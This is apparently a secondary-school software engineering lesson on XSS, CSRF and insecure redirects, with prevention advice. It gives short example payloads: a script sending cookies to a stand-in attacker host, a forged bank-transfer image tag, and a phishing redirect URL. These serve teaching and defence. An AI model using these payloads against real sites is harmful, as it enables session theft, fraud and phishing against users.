---
description: >-
  Learn how attackers exploit web applications through XSS, CSRF, and insecure
  redirects — and how to prevent these vulnerabilities using secure coding
  practices.
---

# 430.5 Web-based threats: XSS, CSRF, and redirect flaws

### Objectives

* Identify how common user action vulnerabilities like XSS, CSRF, and insecure redirects occur
* Explain how these vulnerabilities affect confidentiality, integrity, and trust
* Apply secure coding strategies to prevent them in real-world systems

### Syllabus references

<details>

<summary><a href="https://curriculum.nsw.edu.au/learning-areas/tas/software-engineering-11-12-2022/content/year-12/fa039e749d">Secure software architecture</a></summary>

* Design, develop and implement secure code to minimise vulnerabilities in user action controls, including:\
  – cross-site scripting (XSS)\
  – cross-site request forgery (CSRF)\
  – invalid forwarding and redirecting

</details>

### Cross-site scripting (XSS)

**XSS** occurs when an attacker injects malicious JavaScript into a web page that is later displayed to other users. This script can steal cookies, hijack sessions, or change what the user sees.

#### Example:

A comment field that saves user input without escaping tags:

```html
<!-- Attacker submits this as a comment -->
<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
```

If the website displays this directly, any user who views the page will unknowingly run the attacker’s script.

#### Prevention:

* [**Escape**](#user-content-fn-1)[^1] **or** [**encode**](#user-content-fn-2)[^2] **output** when displaying user input
* Use a templating engine that automatically escapes HTML (e.g. Jinja2, React)
* Validate input to allow only safe content (e.g. plain text)

### Cross-site request forgery (CSRF)

**CSRF** tricks a logged-in user into submitting an unwanted request to a site they’re authenticated with — usually without their knowledge.

#### Example:

An attacker sends a link to a logged-in banking user that silently transfers funds:

```html
<img src="https://bank.com/transfer?amount=1000&to=attacker"/>
```

If the user is logged in, the browser sends the request with the user’s session cookies, and the transfer goes through.

#### Prevention:

* Use **CSRF tokens** — random values tied to the session and submitted with each form
* Validate tokens server-side
* Use the **SameSite** cookie flag and **POST** requests for sensitive actions

### Invalid forwarding and redirecting

Some sites allow users to choose where to go next (e.g., after logging in). If this redirect destination is not validated, attackers can redirect users to **malicious lookalike sites**.

#### Example:

```http
https://school.com/login?next=http://phishingsite.com
```

If the app redirects users to `next` without checking it, users may be tricked into entering credentials on the phishing page.

#### Prevention:

* Never trust redirect URLs from the client
* Keep a whitelist of allowed redirect destinations
* Use relative paths (e.g. `/dashboard`) instead of complete URLs

***

### Summary

* **XSS** allows attackers to inject scripts that run in the browser
* **CSRF** tricks users into sending unwanted requests while logged in
* **Insecure redirects** allow phishing attacks or loss of trust
* All of these flaws can be mitigated by validating input, encoding output, and following safe design patterns

[^1]: To **escape** user input means to convert special characters (like `<`, `>`, `"`, `'`) into a safe format (e.g. `&lt;`, `&gt;`) so they are treated as plain text, not executable code. This prevents malicious scripts from being interpreted by the browser, and is essential in defending against cross-site scripting (XSS) attacks.

[^2]: To **encode** user input means to convert special characters into a safe, displayable format so they are not interpreted as code by the browser. This ensures that user-generated content appears as text rather than being executed — a key defence against XSS attacks. Output encoding is often used interchangeably with escaping in web security.
